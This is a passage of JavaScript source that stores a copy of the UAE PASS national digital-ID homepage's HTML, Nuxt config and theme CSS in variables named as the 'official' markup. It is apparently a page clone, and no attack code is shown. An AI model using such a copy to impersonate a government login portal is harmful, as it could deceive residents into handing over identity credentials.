mb-2">UAE PASS enables users to login and access many government, semi government and private entities services easily and securely with few simple steps.</p><p data-v-6592a0cb="" class="tip__learn font-weight-600 text-color-on-surface-variant mt-10">learn more about the services you can reach through UAE PASS  digital id</p><div data-v-6592a0cb="" class="d-flex flex-wrap"><button data-v-6592a0cb="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-tonal me-sm-4 me-2 mt-5 font-weight-600 d-flex text-color-on-primary bg-color-primary-0 cursor-pointer"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i data-v-6592a0cb="" class="mdi-compass-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default me-2" aria-hidden="true" style="color: rgb(255, 255, 255); caret-color: rgb(255, 255, 255);"></i><span data-v-6592a0cb="" class="letter-spacing-0">Explore Our Partners</span></span><!----><!----></button><button data-v-6592a0cb="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-text mt-5 font-weight-600 d-flex text-color-primary-60 cursor-pointer"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i data-v-6592a0cb="" class="mdi-play-circle-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default me-2" aria-hidden="true" style="color: rgb(17, 165, 111); caret-color: rgb(17, 165, 111);"></i><span data-v-6592a0cb="" class="letter-spacing-0">Watch Video</span></span><!----><!----></button></div></div><div data-v-6592a0cb="" class="d-flex align-center justify-center py-sm-13 py-7"><div data-v-6592a0cb="" class="v-responsive v-img v-img--booting tip__image" aria-label="[object Object] image" role="img"><div class="v-responsive__sizer"></div><!----><!----><!----><!----><!----><!----></div></div></div><div data-v-6592a0cb="" id="digitalSignature" class="d-flex justify-space-between tip mt-8 flex-row-reverse flex-column-reverse flex-sm-row-reverse"><div data-v-6592a0cb="" class="tip__text d-flex flex-column justify-center"><p data-v-6592a0cb="" class="tip__phone text-color-secondary-secondary font-weight-600 text-body-2 mb-2">THROUGH YOUR SMARTPHONE</p><h2 data-v-6592a0cb="" class="tip__heading mb-4 text-color-gray-70 font-weight-600" data-uw-rm-heading="prs">Sign Documents Digitally</h2><p data-v-6592a0cb="" class="tip__desc text-color-gray-50 mb-2">You can now easily sign a document digitally with UAE PASS. Just download a document, sign it through the  UAE PASS app or selfcare portal, then share it. You can also verify digital signatures by uploading a document and validating it as needed from the verify feature available on all channels.</p><p data-v-6592a0cb="" class="tip__learn font-weight-600 text-color-on-surface-variant mt-10">learn more about the services you can reach through UAE PASS  digital id</p><div data-v-6592a0cb="" class="v-sheet v-theme--uaepassDefaultTheme d-flex flex-wrap mt-5" style="gap: 8px 0px;"><button data-v-6592a0cb="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-tonal me-lg-4 me-2 mt-sm-0 mt-2 d-flex" data-test="sign-button"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i class="uaepass-pencil-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default text-white me-2" aria-hidden="true"></i><span class="font-weight-600 letter-spacing-0">Sign Document</span></span><!----><!----></button><input data-v-92d5a344="" type="file" name="upload" hidden="" accept="application/pdf" aria-label="upload file"><button data-v-92d5a344="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-tonal me-lg-4 me-2 mt-sm-0 mt-2 verify__btn"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i data-v-92d5a344="" class="mdi-check-decagram-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default text-white me-2" aria-hidden="true"></i><span data-v-92d5a344="" class="font-weight-600 letter-spacing-0">Verify Document</span></span><!----><!----></button><!----><!----><!----><!----><!----><!----></div></div><div data-v-6592a0cb="" class="d-flex align-center justify-center py-sm-13 py-7"><div data-v-6592a0cb="" class="v-responsive v-img v-img--booting tip__image" aria-label="[object Object] image" role="img"><div class="v-responsive__sizer"></div><!----><!----><!----><!----><!----><!----></div></div></div><div data-v-6592a0cb="" id="documentSharing" class="d-flex justify-space-between tip mt-8 flex-row flex-column-reverse flex-sm-row"><div data-v-6592a0cb="" class="tip__text d-flex flex-column justify-center"><p data-v-6592a0cb="" class="tip__phone text-color-secondary-secondary font-weight-600 text-body-2 mb-2">THROUGH YOUR SMARTPHONE</p><h2 data-v-6592a0cb="" class="tip__heading mb-4 text-color-gray-70 font-weight-600" data-uw-rm-heading="prs">Request and Share Official Documents</h2><p data-v-6592a0cb="" class="tip__desc text-color-gray-50 mb-2">UAE PASS enables you to request a digital version of your official documents from different entities in the country.  . This feature eliminates the need for paper and physical visits to service providers, saving you time and effort. It is also powered by blockchain technology, providing you with optimal traceability and security on your online transactions.”</p><p data-v-6592a0cb="" class="tip__learn font-weight-600 text-color-on-surface-variant mt-10">learn more about the services you can reach through UAE PASS  digital id</p><div data-v-6592a0cb="" class="d-flex flex-wrap"><button data-v-6592a0cb="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-tonal me-sm-4 me-2 mt-5 font-weight-600 d-flex text-color-on-primary bg-color-primary-0 cursor-pointer"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i data-v-6592a0cb="" class="mdi-compass-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default me-2" aria-hidden="true" style="color: rgb(255, 255, 255); caret-color: rgb(255, 255, 255);"></i><span data-v-6592a0cb="" class="letter-spacing-0">Explore Services</span></span><!----><!----></button><button data-v-6592a0cb="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-text mt-5 font-weight-600 d-flex text-color-primary-60 cursor-pointer"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><!----><span class="v-btn__content" data-no-activator=""><i data-v-6592a0cb="" class="mdi-play-circle-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default me-2" aria-hidden="true" style="color: rgb(17, 165, 111); caret-color: rgb(17, 165, 111);"></i><span data-v-6592a0cb="" class="letter-spacing-0">Watch Video</span></span><!----><!----></button></div></div><div data-v-6592a0cb="" class="d-flex align-center justify-center py-sm-13 py-7"><div data-v-6592a0cb="" class="v-responsive v-img v-img--booting tip__image" aria-label="[object Object] image" role="img"><div class="v-responsive__sizer"></div><!----><!----><!----><!----><!----><!----></div></div></div></div><div data-v-19c9428e="" class="signup"><h2 data-v-19c9428e="" class="signup__head text-color-gray-70 font-weight-bold mb-4" data-uw-rm-heading="prs">Sign up in 3 Simple Steps</h2><p data-v-19c9428e="" class="signup__desc mb-sm-16 mb-0">With easy digital onboarding</p><div data-v-19c9428e="" class="d-flex flex-sm-row flex-column align-center align-sm-start justify-space-between"><div data-v-5b98be8d="" data-v-19c9428e="" class="d-flex flex-column text-center align-center register__step mt-sm-0 mt-10"><div data-v-5b98be8d="" class="v-responsive v-img v-img--booting register__banner-img" aria-label="step icon" role="img"><div class="v-responsive__sizer"></div><!----><!----><!----><!----><!----><!----></div><h3 data-v-5b98be8d="" class="register__head mt-n4" data-uw-rm-heading="prs">Download</h3><p data-v-5b98be8d="" class="register__desc mt-3">Download the official UAE PASS application through</p><div data-v-5b98be8d="" class="d-flex mt-4"><span data-v-5b98be8d=""><a data-v-5b98be8d="" aria-label="navigate to https://itunes.apple.com/ae/app/uae-pass/id1377158818?mt=8" class="cursor-pointer" tabindex="0"><div data-v-5b98be8d="" class="v-responsive v-img v-img--booting me-2 register__img" aria-label="action step image" role="img"><div class="v-responsive__sizer"></div><!----><!----><!----><!----><!----><!----></div></a></span><span data-v-5b98be8d=""><a data-v-5b98be8d="" aria-label="navigate to https://play.google.com/store/apps/details?id=ae.uaepass.mainapp" class="cursor-pointer" tabindex="0"><div data-v-5b98be8d="" class="v-responsive v-img v-img--booting me-2 register__img" aria-label="action step image" role="img"><div class="v-responsive__sizer"></div><!----><!----><!----><!----><!----><!----></div></a></span></div></div><div data-v-5b98be8d="" data-v-19c9428e="" class="d-flex flex-column text-center align-center register__step mt-sm-0 mt-10"><div data-v-5b98be8d="" class="v-responsive v-img v-img--booting register__banner-img" aria-label="step icon" role="img"><div class="v-responsive__sizer"></div><!----><!----><!----><!----><!----><!----></div><h3 data-v-5b98be8d="" class="register__head mt-n4" data-uw-rm-heading="prs">Register</h3><p data-v-5b98be8d="" class="register__desc mt-3">Register your account using your Emirates ID, GCC ID, or passport</p><div data-v-5b98be8d="" class="d-flex mt-4"><span data-v-5b98be8d=""><button data-v-5b98be8d="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-text cursor-pointer"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><span class="v-btn__prepend"><i data-v-5b98be8d="" class="mdi-play-circle-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default text-success" aria-hidden="true"></i></span><span class="v-btn__content" data-no-activator=""> Watch Video</span><!----><!----></button></span></div></div><div data-v-5b98be8d="" data-v-19c9428e="" class="d-flex flex-column text-center align-center register__step mt-sm-0 mt-10"><div data-v-5b98be8d="" class="v-responsive v-img v-img--booting register__banner-img" aria-label="step icon" role="img"><div class="v-responsive__sizer"></div><!----><!----><!----><!----><!----><!----></div><h3 data-v-5b98be8d="" class="register__head mt-n4" data-uw-rm-heading="prs">Verify</h3><p data-v-5b98be8d="" class="register__desc mt-3">Verify your account through Face Verification OR visiting a Nearest Kiosk</p><div data-v-5b98be8d="" class="d-flex mt-4"><span data-v-5b98be8d=""><button data-v-5b98be8d="" type="button" class="v-btn v-theme--uaepassDefaultTheme v-btn--density-default v-btn--size-default v-btn--variant-text cursor-pointer"><span class="v-btn__overlay"></span><span class="v-btn__underlay"></span><span class="v-btn__prepend"><i data-v-5b98be8d="" class="mdi-map-marker-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme v-icon--size-default text-success" aria-hidden="true"></i></span><span class="v-btn__content" data-no-activator=""> Nearest Kiosk</span><!----><!----></button></span></div></div></div></div><div data-v-cc0dc5fb="" class="bg-color-surface-1"><div data-v-cc0dc5fb="" class="contact"><div data-v-c8286ac5="" data-v-cc0dc5fb="" class="header"><h2 data-v-c8286ac5="" class="header__head text-center mb-4 font-weight-bold text-color-gray-70" data-uw-rm-heading="prs">Contact Support</h2><p data-v-c8286ac5="" class="header__desc text-center mx-auto text-color-gray-50">Think we didn’t answer your questions correctly or maybe you have other enquiries we didn’t cover correctly or maybe you have other enquiries we didn’t cover?</p></div><div data-v-9b4e19f4="" data-v-cc0dc5fb="" class="text-center mt-8"><p data-v-9b4e19f4="" class="contact__text text-color-gray-50 font-weight-600">Call Us Now!</p><div data-v-9b4e19f4="" style="direction: ltr;"><a data-v-9b4e19f4="" href="tel:600561111" class="contact__number text-decoration-none text-color-primary-60 font-weight-bold" aria-label="call 600561111" data-uw-rm-vglnk="" uw-rm-vague-link-id="tel:600561111$call 600561111">600 56 1111</a></div></div></div></div><!----><!----></div><div data-v-f785e284="" data-v-1f289850="" class="footer__wrapper"><div data-v-f785e284="" class="footer__content py-md-16 py-8 px-md-8 px-4 ma-auto"><div data-v-f760f074="" data-v-f785e284="" class="d-flex justify-space-between flex-md-row flex-column"><h2 data-v-f760f074="" class="footer__description mb-md-0 mb-8" data-uw-rm-heading="prs">Your secure national digital identity in the UAE</h2><div data-v-f760f074="" class="d-flex flex-column"><div data-v-f760f074="" class="d-flex"><i data-v-f760f074="" class="mdi-crosshairs-gps mdi v-icon notranslate v-theme--uaepassDefaultTheme text-white" aria-hidden="true" style="font-size: 18px; height: 18px; width: 18px;"></i><p data-v-f760f074="" class="footer__uae ps-2">United Arab Emirates</p></div><div data-v-f760f074="" class="d-flex mt-3"><i data-v-f760f074="" class="mdi-phone mdi v-icon notranslate v-theme--uaepassDefaultTheme text-white" aria-hidden="true" style="font-size: 18px; height: 18px; width: 18px;"></i><a data-v-f760f074="" class="footer__phone ps-2" href="tel:600561111" aria-label="call 600561111" data-uw-rm-vglnk="" uw-rm-vague-link-id="tel:600561111$call 600561111" style="direction: ltr;">600 56 1111</a></div><div data-v-f760f074="" class="d-flex mt-3"><i data-v-f760f074="" class="mdi-email-outline mdi v-icon notranslate v-theme--uaepassDefaultTheme text-white" aria-hidden="true" style="font-size: 18px; height: 18px; width: 18px;"></i><a data-v-f760f074="" class="footer__mail ps-2" href="mailto:support@uaepass.ae">support@uaepass.ae</a></div></div></div><hr data-v-f785e284="" class="v-divider v-theme--uaepassDefaultTheme text-white" aria-orientation="horizontal" role="separator"><div data-v-d076b49a="" data-v-f785e284="" class="d-flex justify-md-space-between flex-md-row flex-column"><div data-v-d076b49a="" class="mb-md-0 mb-4 d-flex flex-wrap"><a data-v-d076b49a="" aria-label="About Us" class="footer__link me-lg-12 me-md-8 me-6 cursor-pointer" tabindex="0">About</a><a data-v-d076b49a="" aria-label="Frequently Asked Questions" class="footer__link me-lg-12 me-md-8 me-6 cursor-pointer" tabindex="0">FAQs</a><a data-v-d076b49a="" aria-label="Ask for support" class="footer__link me-lg-12 me-md-8 me-6 cursor-pointer" tabindex="0">Support</a><a data-v-d076b49a="" aria-label="See Kiosk Locations" class="footer__link me-lg-12 me-md-8 me-6 cursor-pointer" tabindex="0">Kiosk Locations</a><a data-v-d076b49a="" aria-label="See our partners" class="footer__link me-lg-12 me-md-8 me-6 cursor-pointer" tabindex="0">Partners</a><a data-v-d076b49a="" aria-label="Developers" class="footer__link me-lg-12 me-md-8 me-6 cursor-pointer" tabindex="0">Developers</a></div><p data-v-d076b49a="" class="footer__copyright">Copyright © 2026 UAE PASS All rights reserved.</p></div></div></div><!----><div class="icon__container-survey d-flex align-center justify-center"><div class="icon__wrapper d-flex align-center justify-center v-expand-transition" aria-haspopup="dialog" aria-describedby="v-tooltip-13"><!----><i class="uaepass-feedback mdi v-icon notranslate v-theme--uaepassDefaultTheme text-secondary v-icon--clickable icon__survey" role="button" aria-hidden="false" tabindex="0" aria-label="button" data-uw-rm-empty-ctrl="" style="font-size: 25px; height: 25px; width: 25px;"></i></div><!----></div></main></div></div><!----></div></div><div id="teleports"></div><script type="application/json" data-nuxt-data="nuxt-app" data-ssr="false" id="__NUXT_DATA__">[{"serverRendered":1},false]</script>
<script>window.__NUXT__={};window.__NUXT__.config={public:{happinessAndroidUrl:"uaepass://happiness",happinessIosUrl:"uaepass://happiness",happinessLink:"https://uaepass.ae/?happiness=true",envPrefix:"pr",envDomain:"uaepass.ae",clientId:"self_service",serverType:"oauth2",txLoginUrl:"https://id.uaepass.ae/",idsLoginUrl:"https://ids.uaepass.ae/",oauthReturn:"https://uaepass.ae/api/auth/signed-in",logoutReturn:"https://uaepass.ae/auth/logout",appOauthReturn:"https://selfcare.uaepass.ae/auth/signed-in",appUrl:"https://selfcare.uaepass.ae",baseUrl:"https://uaepass.ae",apmEnabled:true,apmKey:"8ad2d9a4528bf128d8ff45b0e017b930",googleRecaptchaKey:"6Ldc8w8pAAAAAFRXgfOK5_DIx1He2KdiSn5cRwMw",gmapsApiKey:"AIzaSyAp04kuy3nJfAl4u0NeDKLRvL0Ajo6Loys",deepLinkIos:"https://itunes.apple.com/ae/app/uae-pass/id1377158818?mt=8",deepLinkAndroid:"https://play.google.com/store/apps/details?id=ae.uaepass.mainapp",uaePassSelfCareScopes:"urn:uae:digitalid:profile,urn:uae:digitalid:backend_api:history,urn:uae:digitalid:backend_api:user_notifications,urn:uae:digitalid:backend_api:certificate_data,urn:uae:digitalid:backend_api:support,urn:uae:digitalid:backend_api:manage_device,urn:uae:digitalid:backend_api:revoke_device,urn:uae:digitalid:backend_api:update_profile,urn:uae:digitalid:backend_api:get_profile,urn:uae:digitalid:backend_api:otp,urn:uae:digitalid:backend_api:secure_update_profile,openid,urn:uae:digitalid:backend_api:hash_sign:manage,urn:uae:digitalid:backend_api:txn-history:manage,urn:uae:digitalid:backend_api:user-document:manage,openid,urn:uae:digitalid:backend_api:hash_sign:manage",uaePassWebScopes:"urn:uae:digitalid:profile,urn:uae:digitalid:backend_api:support,urn:uae:digitalid:backend_api:get_profile,openid,urn:uae:digitalid:backend_api:txn-history:manage,urn:uae:digitalid:backend_api:user-document:manage",adrumAppKey:"EUM-AAB-AUB",beaconUrlHttp:"http://appd-eum.smartdubai.ae",beaconUrlHttps:"https://appd-eum.smartdubai.ae",isSurveyOn:true,isChatOn:false,isAccessibilityOn:true,isVideoTutorialsEnabled:true,chatUrl:"https://qa-chatportal.uaepass.ae",disabledRoutes:"",i18n:{baseUrl:"",defaultLocale:"en-US",defaultDirection:"ltr",strategy:"no_prefix",lazy:true,rootRedirect:"",routesNameSeparator:"___",defaultLocaleRouteNameSuffix:"default",skipSettingLocaleOnNavigate:false,differentDomains:false,trailingSlash:false,locales:[{code:"ar-AE",name:"العربية",dir:"rtl",files:["/opt/app-root/src/i18n/locales/ar-AE.js"]},{code:"en-US",name:"English",files:["/opt/app-root/src/i18n/locales/en-US.js"]}],detectBrowserLanguage:{alwaysRedirect:true,cookieCrossOrigin:false,cookieDomain:"",cookieKey:"i18n_redirected",cookieSecure:false,fallbackLocale:"",redirectOn:"root",useCookie:true},experimental:{localeDetector:"",switchLocalePathLinkSSR:false,autoImportTranslationFunctions:false,typedPages:true,typedOptionsAndMessages:false,generatedLocaleFilePathFormat:"absolute"},multiDomainLocales:false},device:{defaultUserAgent:"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.39 Safari/537.36",enabled:true,refreshOnResize:false}},app:{baseURL:"/",buildId:"8a6fd660-7677-4074-bcab-ee001d8e5273",buildAssetsDir:"/_nuxt/",cdnURL:""}}</script><script src="https://cdn.userway.org/widgetapp/2026-05-07-22-41-57/widget_app_base_1778193717904.js" async="" id="a11yWidgetSrc" crossorigin="anonymous" integrity="sha256-172JtDkZfSFUcu+uxtTjQHj++UrCQbSmrtXQizQdLVI="></script><script crossorigin="anonymous" integrity="sha256-05+PUXVKWGwOUtj5tz4yqJBGbnYUIUxyD4L+2mo0tvY=" src="https://cdn.userway.org/widgetapp/2026-05-07-22-41-57/remediation/remediation_1778193717904.js"></script><script crossorigin="anonymous" integrity="sha256-vcuerVeJITo/VvD/X3mqlqOJc3JDtstT2Nld1veAPw4=" src="https://cdn.userway.org/remediation/2026-05-07-22-41-57/paid/remediation-tool.js?ts=1778193717904"></script><div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-v8ar7j4sig8w" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6Ldc8w8pAAAAAFRXgfOK5_DIx1He2KdiSn5cRwMw&amp;co=aHR0cHM6Ly91YWVwYXNzLmFlOjQ0Mw..&amp;hl=en&amp;v=U5VsmTDhJM1iOJUyw4DEUTYv&amp;size=invisible&amp;badge=bottomright&amp;anchor-ms=20000&amp;execute-ms=30000&amp;cb=f80ngdudzd8s"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" data-uw-rm-form="fx" aria-label="Text area" data-uw-hidden-control="hidden-control-element" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div><div class="v-overlay-container"><div class="v-overlay v-overlay--absolute v-theme--uaepassDefaultTheme v-locale--is-ltr v-tooltip" id="v-tooltip-13" role="tooltip" style="z-index: 2000;"><!----><div class="v-overlay__content tooltip__survey" target="[object HTMLDivElement]" style="min-width: 0px; display: none;">Rate Your Experience</div></div></div><script crossorigin="anonymous" integrity="sha256-uQvqVFkqQfXu3KoL7QNfDxJ7bZvVkXB5Q5/7Eh/4OQs=" src="https://cdn.userway.org/widgetapp/2026-05-07-22-41-57/remediation/nav_menu_helper_1778193717904.js"></script>`;
  const officialCSS = `.grecaptcha-badge{visibility:hidden !important;}
:root {
      --v-theme-background: 242,244,240;
      --v-theme-background-overlay-multiplier: 1;
      --v-theme-surface: 255,255,255;
      --v-theme-surface-overlay-multiplier: 1;
      --v-theme-surface-bright: 255,255,255;
      --v-theme-surface-bright-overlay-multiplier: 1;
      --v-theme-surface-light: 238,238,238;
      --v-theme-surface-light-overlay-multiplier: 1;
      --v-theme-surface-variant: 66,66,66;
      --v-theme-surface-variant-overlay-multiplier: 2;
      --v-theme-on-surface-variant: 238,238,238;
      --v-theme-primary: 17,165,111;
      --v-theme-primary-overlay-multiplier: 1;
      --v-theme-primary-darken-1: 31,85,146;
      --v-theme-primary-darken-1-overlay-multiplier: 2;
      --v-theme-secondary: 170,143,0;
      --v-theme-secondary-overlay-multiplier: 1;
      --v-theme-secondary-darken-1: 1,135,134;
      --v-theme-secondary-darken-1-overlay-multiplier: 1;
      --v-theme-error: 255,85,69;
      --v-theme-error-overlay-multiplier: 1;
      --v-theme-info: 26,156,202;
      --v-theme-info-overlay-multiplier: 1;
      --v-theme-success: 76,162,91;
      --v-theme-success-overlay-multiplier: 1;
      --v-theme-warning: 199,130,0;
      --v-theme-warning-overlay-multiplier: 1;
      --v-theme-on-background: 0,0,0;
      --v-theme-on-surface: 0,0,0;
      --v-theme-on-surface-bright: 0,0,0;
      --v-theme-on-surface-light: 0,0,0;
      --v-theme-on-primary: 255,255,255;
      --v-theme-on-primary-darken-1: 255,255,255;
      --v-theme-on-secondary: 255,255,255;
      --v-theme-on-secondary-darken-1: 255,255,255;
      --v-theme-on-error: 255,255,255;
      --v-theme-on-info: 255,255,255;
      --v-theme-on-success: 255,255,255;
      --v-theme-on-warning: 255,255,255;
      --v-border-color: 0, 0, 0;
      --v-border-opacity: 0.12;
      --v-high-emphasis-opacity: 0.87;
      --v-medium-emphasis-opacity: 0.6;
      --v-disabled-opacity: 0.38;
      --v-idle-opacity: 0.04;
      --v-hover-opacity: 0.04;
      --v-focus-opacity: 0.12;
      --v-selected-opacity: 0.08;
      --v-activated-opacity: 0.12;
      --v-pressed-opacity: 0.12;
      --v-dragged-opacity: 0.08;
      --v-theme-kbd: 33, 37, 41;
      --v-theme-on-kbd: 255, 255, 255;
      --v-theme-code: 245, 245, 245;
      --v-theme-on-code: 0, 0, 0;
    }
    .v-theme--light {
      color-scheme: normal;
      --v-theme-background: 255,255,255;
      --v-theme-background-overlay-multiplier: 1;
      --v-theme-surface: 255,255,255;
      --v-theme-surface-overlay-multiplier: 1;
      --v-theme-surface-bright: 255,255,255;
      --v-theme-surface-bright-overlay-multiplier: 1;
      --v-theme-surface-light: 238,238,238;
      --v-theme-surface-light-overlay-multiplier: 1;
      --v-theme-surface-variant: 66,66,66;
      --v-theme-surface-variant-overlay-multiplier: 2;
      --v-theme-on-surface-variant: 238,238,238;
      --v-theme-primary: 24,103,192;
      --v-theme-primary-overlay-multiplier: 2;
      --v-theme-primary-darken-1: 31,85,146;
      --v-theme-primary-darken-1-overlay-multiplier: 2;
      --v-theme-secondary: 72,169,166;
      --v-theme-secondary-overlay-multiplier: 1;
      --v-theme-secondary-darken-1: 1,135,134;
      --v-theme-secondary-darken-1-overlay-multiplier: 1;
      --v-theme-error: 176,0,32;
      --v-theme-error-overlay-multiplier: 2;
      --v-theme-info: 33,150,243;
      --v-theme-info-overlay-multiplier: 1;
      --v-theme-success: 76,175,80;
      --v-theme-success-overlay-multiplier: 1;
      --v-theme-warning: 251,140,0;
      --v-theme-warning-overlay-multiplier: 1;
      --v-theme-on-background: 0,0,0;
      --v-theme-on-surface: 0,0,0;
      --v-theme-on-surface-bright: 0,0,0;
      --v-theme-on-surface-light: 0,0,0;
      --v-theme-on-primary: 255,255,255;
      --v-theme-on-primary-darken-1: 255,255,255;
      --v-theme-on-secondary: 255,255,255;
      --v-theme-on-secondary-darken-1: 255,255,255;
      --v-theme-on-error: 255,255,255;
      --v-theme-on-info: 255,255,255;
      --v-theme-on-success: 255,255,255;
      --v-theme-on-warning: 255,255,255;
      --v-border-color: 0, 0, 0;
      --v-border-opacity: 0.12;
      --v-high-emphasis-opacity: 0.87;
      --v-medium-emphasis-opacity: 0.6;
      --v-disabled-opacity: 0.38;
      --v-idle-opacity: 0.04;
      --v-hover-opacity: 0.04;
      --v-focus-opacity: 0.12;
      --v-selected-opacity: 0.08;
      --v-activated-opacity: 0.12;
      --v-pressed-opacity: 0.12;
      --v-dragged-opacity: 0.08;
      --v-theme-kbd: 33, 37, 41;
      --v-theme-on-kbd: 255, 255, 255;
      --v-theme-code: 245, 245, 245;
      --v-theme-on-code: 0, 0, 0;
    }
    .v-theme--dark {
      color-scheme: dark;
      --v-theme-background: 18,18,18;
      --v-theme-background-overlay-multiplier: 1;
      --v-theme-surface: 33,33,33;
      --v-theme-surface-overlay-multiplier: 1;
      --v-theme-surface-bright: 204,191,214;
      --v-theme-surface-bright-overlay-multiplier: 2;
      --v-theme-surface-light: 66,66,66;
      --v-theme-surface-light-overlay-multiplier: 1;
      --v-theme-surface-variant: 163,163,163;
      --v-theme-surface-variant-overlay-multiplier: 2;
      --v-theme-on-surface-variant: 66,66,66;
      --v-theme-primary: 33,150,243;
      --v-theme-primary-overlay-multiplier: 2;
      --v-theme-primary-darken-1: 39,124,193;
      --v-theme-primary-darken-1-overlay-multiplier: 2;
      --v-theme-secondary: 84,182,178;
      --v-theme-secondary-overlay-multiplier: 2;
      --v-theme-secondary-darken-1: 72,169,166;
      --v-theme-secondary-darken-1-overlay-multiplier: 2;
      --v-theme-error: 207,102,121;
      --v-theme-error-overlay-multiplier: 2;
      --v-theme-info: 33,150,243;
      --v-theme-info-overlay-multiplier: 2;
      --v-theme-success: 76,175,80;
      --v-theme-success-overlay-multiplier: 2;
      --v-theme-warning: 251,140,0;
      --v-theme-warning-overlay-multiplier: 2;
      --v-theme-on-background: 255,255,255;
      --v-theme-on-surface: 255,255,255;
      --v-theme-on-surface-bright: 0,0,0;
      --v-theme-on-surface-light: 255,255,255;
      --v-theme-on-primary: 255,255,255;
      --v-theme-on-primary-darken-1: 255,255,255;
      --v-theme-on-secondary: 255,255,255;
      --v-theme-on-secondary-darken-1: 255,255,255;
      --v-theme-on-error: 255,255,255;
      --v-theme-on-info: 255,255,255;
      --v-theme-on-success: 255,255,255;
      --v-theme-on-warning: 255,255,255;
      --v-border-color: 255, 255, 255;
      --v-border-opacity: 0.12;
      --v-high-emphasis-opacity: 1;
      --v-medium-emphasis-opacity: 0.7;
      --v-disabled-opacity: 0.5;
      --v-idle-opacity: 0.1;
      --v-hover-opacity: 0.04;
      --v-focus-opacity: 0.12;
      --v-selected-opacity: 0.08;
      --v-activated-opacity: 0.12;
      --v-pressed-opacity: 0.16;
      --v-dragged-opacity: 0.08;
      --v-theme-kbd: 33, 37, 41;
      --v-theme-on-kbd: 255, 255, 255;
      --v-theme-code: 52, 52, 52;
      --v-theme-on-code: 204, 204, 204;
    }
    .v-theme--uaepassDefaultTheme {
      color-scheme: normal;
      --v-theme-background: 242,244,240;
      --v-theme-background-overlay-multiplier: 1;
      --v-theme-surface: 255,255,255;
      --v-theme-surface-overlay-multiplier: 1;
      --v-theme-surface-bright: 255,255,255;
      --v-theme-surface-bright-overlay-multiplier: 1;
      --v-theme-surface-light: 238,238,238;
      --v-theme-surface-light-overlay-multiplier: 1;
      --v-theme-surface-variant: 66,66,66;
      --v-theme-surface-variant-overlay-multiplier: 2;
      --v-theme-on-surface-variant: 238,238,238;
      --v-theme-primary: 17,165,111;
      --v-theme-primary-overlay-multiplier: 1;
      --v-theme-primary-darken-1: 31,85,146;
      --v-theme-primary-darken-1-overlay-multiplier: 2;
      --v-theme-secondary: 170,143,0;
      --v-theme-secondary-overlay-multiplier: 1;
      --v-theme-secondary-darken-1: 1,135,134;
      --v-theme-secondary-darken-1-overlay-multiplier: 1;
      --v-theme-error: 255,85,69;
      --v-theme-error-overlay-multiplier: 1;
      --v-theme-info: 26,156,202;
      --v-theme-info-overlay-multiplier: 1;
      --v-theme-success: 76,162,91;
      --v-theme-success-overlay-multiplier: 1;
      --v-theme-warning: 199,130,0;
      --v-theme-warning-overlay-multiplier: 1;
      --v-theme-on-background: 0,0,0;
      --v-theme-on-surface: 0,0,0;
      --v-theme-on-surface-bright: 0,0,0;
      --v-theme-on-surface-light: 0,0,0;
      --v-theme-on-primary: 255,255,255;
      --v-theme-on-primary-darken-1: 255,255,255;
      --v-theme-on-secondary: 255,255,255;
      --v-theme-on-secondary-darken-1: 255,255,255;
      --v-theme-on-error: 255,255,255;
      --v-theme-on-info: 255,255,255;
      --v-theme-on-success: 255,255,255;
      --v-theme-on-warning: 255,255,255;
      --v-border-color: 0, 0, 0;
      --v-border-opacity: 0.12;
      --v-high-emphasis-opacity: 0.87;
      --v-medium-emphasis-opacity: 0.6;
      --v-disabled-opacity: 0.38;
      --v-idle-opacity: 0.04;
      --v-hover-opacity: 0.04;
      --v-focus-opacity: 0.12;
      --v-selected-opacity: 0.08;
      --v-activated-opacity: 0.12;
      --v-pressed-opacity: 0.12;
      --v-dragged-opacity: 0.08;
      --v-theme-kbd: 33, 37, 41;
      --v-theme-on-kbd: 255, 255, 255;
      --v-theme-code: 245, 245, 245;
